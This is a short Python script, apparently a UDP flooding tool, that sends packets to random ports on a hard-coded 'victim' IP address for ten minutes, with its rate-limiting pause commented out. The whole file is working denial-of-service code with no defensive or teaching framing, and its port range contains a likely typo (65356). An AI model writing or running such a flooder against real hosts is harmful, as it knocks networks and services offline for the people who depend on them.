import time
import socket
import random
import sys

victim_ip = "192.168.40.0"
duration = 600 # в секундах

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg = bytes(random.getrandbits(10))
timeout = time.time() + duration
sent_packets = 0

while time.time() < timeout:
        victim_port = random.randint(1025, 65356)
        sock.sendto(msg, (victim_ip, victim_port))
        sent_packets += 1
        if (sent_packets > 5000):
                # time.sleep(1)
                sent_packets = 0